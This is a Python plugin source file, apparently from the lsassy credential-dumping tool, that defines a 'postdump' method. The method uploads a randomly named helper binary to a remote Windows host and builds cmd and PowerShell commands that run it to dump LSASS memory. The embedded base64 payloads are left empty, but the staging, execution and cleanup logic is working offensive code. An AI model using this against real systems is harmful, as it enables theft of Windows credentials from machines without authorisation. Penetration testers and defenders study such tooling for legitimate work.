import base64
import random
import string

from lsassy.dumpmethod import IDumpMethod, Dependency


class DumpMethod(IDumpMethod):
    custom_dump_ext_support = False
    dump_ext = "dmp"

    def __init__(self, session, timeout):
        super().__init__(session, timeout)
        self.postdump = Dependency("postdump", ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8)) + ".dll")
        #CLR4 EXE
        self.postdump.content = base64.b64decode("")
        '''
        #CLR2 EXE
        self.postdump.content = base64.b64decode("")
        '''

    def prepare(self, options):
        return self.prepare_dependencies(options, [self.postdump])

    def clean(self):
        self.clean_dependencies([self.postdump])

    def get_commands(self, dump_path=None, dump_name=None, no_powershell=False):
    	#cmd_command = """rundll32 {},Main {}""".format(self.postdump.get_remote_path(), self.dump_name)
        cmd_command = """cd {} && {} -o {}""".format(self.dump_path, self.postdump.get_remote_path(), self.dump_name)
        pwsh_command = """cd {} && {} -o {}""".format(self.dump_path, self.postdump.get_remote_path(), self.dump_name)

        return {
            "cmd": cmd_command,
            "pwsh": pwsh_command
        }
